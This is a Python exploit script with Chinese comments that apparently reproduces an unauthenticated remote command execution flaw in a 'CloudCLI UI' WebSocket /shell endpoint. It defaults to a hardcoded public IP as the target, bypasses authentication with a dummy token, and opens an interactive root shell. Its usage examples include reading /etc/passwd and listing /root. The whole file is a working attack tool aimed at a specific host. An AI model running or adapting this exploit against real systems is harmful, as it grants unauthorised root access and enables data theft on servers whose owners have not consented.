#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CloudCLI UI 未认证 RCE 复现脚本(交互式命令执行)
====================================================
漏洞:WS /shell 未认证任意命令执行(root)
目标:http://42.186.221.231:443/  →  ws://42.186.221.231:443/shell


用法:
    pip install websocket-client
    python cloudcli_rce_shell.py            # 默认目标
    python cloudcli_rce_shell.py <host>     # 指定目标(如 42.186.221.231:443)


交互:输入命令回车执行,输出回显;输入 exit / quit 退出
示例:
    >> whoami            -> root
    >> id                -> uid=0(root)
    >> cat /etc/passwd   -> 任意文件读取
    >> ls -la /root      -> 目录浏览
"""
import json
import sys
import time


DEFAULT_HOST = "42.186.221.231:443"


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    url = f"ws://{host}/shell?token=x"  # 伪 token 即可,平台模式不校验


    import websocket


    print(f"[*] 连接 {url} ...")
    try:
        ws = websocket.create_connection(url, timeout=10)
    except Exception as e:
        print(f"[!] 连接失败: {e}")
        sys.exit(1)
    print(f"[+] 已连接 (status={ws.getstatus()})  — 未认证即 101,漏洞确认")
    print("[*] 输入命令执行,exit/quit 退出\n")


    while True:
        try:
            cmd = input(">> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] 退出")
            break
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            print("[*] 退出")
            break


        # 每次命令开新 shell 会话,保证干净回显
        try:
            ws.close()
        except Exception:
            pass
        ws = websocket.create_connection(url, timeout=10)
        init = {
            "type": "init",
            "projectPath": "/tmp",
            "provider": "plain-shell",
            "initialCommand": cmd,
            "isPlainShell": True,
            "forceRestart": False,
            "cols": 80,
            "rows": 24,
        }
        ws.send(json.dumps(init))


        # 收集回显直到进程退出
        deadline = time.time() + 20
        buf = []
        while time.time() < deadline:
            try:
                ws.settimeout(3)
                msg = ws.recv()
            except websocket.WebSocketTimeoutException:
                continue
            except Exception:
                break
            try:
                d = json.loads(msg)
                data = d.get("data", "")
                buf.append(data)
                if "Process exited" in data or "exited" in data.lower():
                    break
            except Exception:
                buf.append(msg)
        # 去掉启动横幅,只留命令输出
        out = "".join(buf)
        out = out.replace("Starting terminal in: /tmp", "").strip()
        print(f"{out}\n" if out else "(无输出)")


    try:
        ws.close()
    except Exception:
        pass


if __name__ == "__main__":
    main()